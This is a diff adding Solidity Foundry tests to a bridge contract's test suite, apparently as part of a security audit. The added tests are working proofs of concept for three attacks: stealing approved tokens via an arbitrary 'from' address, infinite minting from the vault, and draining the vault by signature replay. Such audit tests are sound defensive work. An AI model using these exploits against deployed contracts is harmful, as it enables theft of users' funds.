@@ -223,4 +223,57 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    //!!! AUDIT
+
+    ///!!! Arbitrary from in transferFrom
+    function testCanMoveApprovedTokensOfOtherUsers() public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        uint256 depositAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, depositAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), depositAmount);
+        vm.stopPrank();
+    }
+
+    //!!! Infinite mint
+    function testCanInfiniteMintTokenInL2() public {
+        address attacker = makeAddr("attacker");
+
+        uint256 vaultBal = 500 ether;
+        deal(address(token), address(vault), vaultBal);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBal);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBal);
+    }
+
+    //!!! Signature Replay Attack
+    function testSignatureReplay() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultInitialBal = 1000e18;
+        uint256 attackerInitialBal = 100e18;
+        deal(address(token), address(vault), vaultInitialBal);
+        deal(address(token), address(attacker), attackerInitialBal);
+
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBal);
+
+        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBal)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+
+        while(token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBal, v, r, s);
+        }
+
+        assertEq(token.balanceOf(attacker), attackerInitialBal + vaultInitialBal);
+    }
 }
